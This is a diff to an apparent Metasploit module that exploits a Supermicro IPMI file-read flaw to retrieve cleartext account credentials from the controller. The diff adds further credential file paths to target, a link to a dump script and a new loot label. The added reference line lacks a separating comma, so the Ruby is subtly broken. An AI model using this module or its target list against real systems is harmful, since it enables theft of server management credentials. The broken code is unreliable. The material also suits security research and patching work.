@@ -23,7 +23,8 @@ class Metasploit3 < Msf::Auxiliary
         a valid, but not necessarily administrator-level account, to access the contents of any file
         on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
         all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
-        with firmware version SMT_X9_214.
+        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
+        /wsman/simple_auth.passwd
       },
       'Author'       =>
         [
@@ -35,6 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           #[ 'CVE', '' ],
           [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ]
+          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
       'DisclosureDate' => 'Nov 06 2013'))
 
@@ -133,7 +135,7 @@ class Metasploit3 < Msf::Auxiliary
 
     file_name = my_basename(datastore['FILEPATH'])
     path = store_loot(
-      'supermicro.ipmi.traversal',
+      'supermicro.ipmi.traversal.psblock',
       'application/octet-stream',
       rhost,
       contents,
